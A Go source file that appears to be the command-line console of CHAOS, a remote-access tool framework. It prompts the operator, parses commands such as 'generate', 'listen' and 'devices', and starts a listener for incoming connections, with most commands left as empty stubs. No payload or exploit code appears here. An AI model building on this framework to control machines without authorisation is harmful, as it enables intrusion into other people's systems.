package app

import (
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/tiagorlampert/CHAOS/internal/handler"
	"github.com/tiagorlampert/CHAOS/internal/handler/server"
	"github.com/tiagorlampert/CHAOS/internal/ui/completer"
	c "github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"strings"
)

type appHandler struct{}

func NewAppHandler() handler.App {
	return &appHandler{}
}

func (c appHandler) Handle() error {
	p := prompt.New(
		executor,
		completer.HostCompleter,
		prompt.OptionPrefix("chaos > "),
		prompt.OptionPrefixTextColor(prompt.White),
	)
	p.Run()

	return nil
}

func executor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch v {
		case "generate":
		case "listen":
			serverHandler(values)
			return
		case "devices":
		case "serve":
		case "exit":
			system.QuitApp()
		default:
			fmt.Println(c.Red, " [!] Invalid parameter!")
			util.Sleep(3)
			system.ClearScreen()
			return
		}
	}
}

func serverHandler(v []string) {
	fmt.Println(v)
	if !contains(v, "port=") {
		fmt.Println(c.Yellow, "[!] You should specify a port!")
		return
	}
	if !contains(v, "address=") {
		fmt.Println(c.Yellow, "[!] You should specify a address!")
		return
	}

	address := util.SplitAfterIndex(find(v, "address="), '=')
	port := util.SplitAfterIndex(find(v, "port="), '=')

	handler := server.NewServerHandler(address, port)
	handler.HandleConnections()
}

func contains(v []string, str string) bool {
	var has bool
	for _, param := range v {
		if strings.Contains(param, str) {
			has = true
			break
		}
	}
	return has
}

func find(v []string, str string) string {
	for _, param := range v {
		if strings.Contains(param, str) {
			return param
		}
	}
	return ""
}
